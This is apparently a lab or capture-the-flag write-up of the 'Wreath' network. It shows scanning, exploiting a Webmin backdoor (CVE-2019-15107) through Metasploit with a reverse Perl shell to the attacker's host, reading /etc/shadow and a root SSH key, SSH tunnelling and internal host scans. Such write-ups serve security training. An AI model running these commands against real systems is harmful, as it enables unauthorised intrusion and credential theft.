## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
_Out of the blue, an old friend from university: Thomas Wreath, calls you after several years of no contact. You spend a few minutes catching up before he reveals the real reason he called:_

> **_"So I heard you got into hacking? That's awesome! I have a few servers set up on my home network for my projects, I was wondering if you might like to assess them?"_**

_You take a moment to think about it, before deciding to accept the job -- it's for a friend after all._

_Turning down his offer of payment, you tell him:_
```

## Network Scan
```bash
Open 10.200.180.200:22
Open 10.200.180.200:80
Open 10.200.180.200:443
Open 10.200.180.200:10000

PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
80/tcp    open  http     syn-ack ttl 63 Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
443/tcp   open  ssl/http syn-ack ttl 63 Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
10000/tcp open  http     syn-ack ttl 63 MiniServ 1.890 (Webmin httpd)'

OS     :     Centos
Service:     MiniServ 1.890 (Webmin httpd)
CVE    :     #CVE-2019-15107
```
## Exploit :-
```bash
$msfconsole
msf > search webmin 1.890
Matching Modules
================
   #  Name                                     Disclosure Date  Rank       Check  Description
   -  ----                                     ---------------  ----       -----  -----------
   0  exploit/linux/http/webmin_backdoor       2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   1    \_ target: Automatic (Unix In-Memory)  .                .          .      .
   2    \_ target: Automatic (Linux Dropper)   .                .          .      .

Interact with a module by name or index. For example info 2, use 2 or use exploit/linux/http/webmin_backdoor
After interacting with a module you can manually set a TARGET with set TARGET 'Automatic (Linux Dropper)'

msf > use 0
[*] Using configured payload cmd/unix/reverse_perl
msf exploit(linux/http/webmin_backdoor) > options

Module options (exploit/linux/http/webmin_backdoor):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported pr
                                    oxies: socks5, socks5h, http, sapni, socks4
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/
                                         basics/using-metasploit.html
   RPORT      10000            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path to Webmin
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on
  the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.

Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:
   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)
View the full module info with the info, or info -d command.
msf exploit(linux/http/webmin_backdoor) > set RHOSTS 10.200.180.200
RHOSTS => 10.200.180.200
msf exploit(linux/http/webmin_backdoor) > set SSL true
[!] Changing the SSL option''s value may require changing RPORT!
SSL => true
msf exploit(linux/http/webmin_backdoor) > set LHOST 10.250.180.3
LHOST => 10.250.180.3
msf exploit(linux/http/webmin_backdoor) >exploit
[*] Started reverse TCP handler on 10.250.180.3:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.250.180.3:4444 -> 10.200.180.200:42522) at 2026-01-21 03:38:28 -0500
pwd
/usr/libexec/webmin
```

#### Reverse-Shell
- Got Files `/etc/shadow` & `/root/.ssh/id_rsa`
- Both way got the access
```bash
$cat /etc/shadow
root:[hash omitted]::0:99999:7:::
bin:*:18358:0:99999:7:::
daemon:*:18358:0:99999:7:::
adm:*:18358:0:99999:7:::
lp:*:18358:0:99999:7:::
sync:*:18358:0:99999:7:::
shutdown:*:18358:0:99999:7:::
halt:*:18358:0:99999:7:::
mail:*:18358:0:99999:7:::
operator:*:18358:0:99999:7:::
games:*:18358:0:99999:7:::
ftp:*:18358:0:99999:7:::
nobody:*:18358:0:99999:7:::
dbus:!!:18573::::::
systemd-coredump:!!:18573::::::
systemd-resolve:!!:18573::::::
tss:!!:18573::::::
polkitd:!!:18573::::::
libstoragemgmt:!!:18573::::::
cockpit-ws:!!:18573::::::
cockpit-wsinstance:!!:18573::::::
sssd:!!:18573::::::
sshd:!!:18573::::::
chrony:!!:18573::::::
rngd:!!:18573::::::
twreath:[hash omitted]::0:99999:7:::
unbound:!!:18573::::::
apache:!!:18573::::::
nginx:!!:18573::::::
mysql:!!:18573::::::
```
- Id_rsa
```id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
[private key omitted]
-----END OPENSSH PRIVATE KEY-----
```

#### Session
```bash
[root@prod-serv ~]# whoami
root
[root@prod-serv ~]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

#### Further Crawling
```bash
$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 06:58:8c:48:d5:01 brd ff:ff:ff:ff:ff:ff
    inet 10.200.180.200/24 brd 10.200.180.255 scope global dynamic noprefixroute eth0
       valid_lft 3572sec preferred_lft 3572sec
    inet6 fe80::458:8cff:fe48:d501/64 scope link
       valid_lft forever preferred_lft forever
[root@prod-serv ~]# ip route
default via 10.200.180.1 dev eth0 proto dhcp metric 100
10.200.180.0/24 dev eth0 proto kernel scope link src 10.200.180.200 metric 100
[root@prod-serv ~]#
```

#### Internal Network
```yaml 
IP        : 10.200.180.200/24
Gateway   : 10.200.180.1
Interface : eth0
```
#### Routing
```nginx
default via 10.200.180.1 dev eth0
10.200.180.0/24 dev eth0
```
#### Another Way using file
```bash
$ssh -L 2222:<victimIP>:22 kali@<attackerIP> -i id_rsa -fN
```

## Internal Hosts
```yaml
10.200.180.100
10.200.180.150
```

- Scaning
```bash
$nmap 10.200.180.150
PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack ttl 128
3389/tcp open  ms-wbt-server syn-ack ttl 128
5985/tcp open  wsman         syn-ack ttl 128
```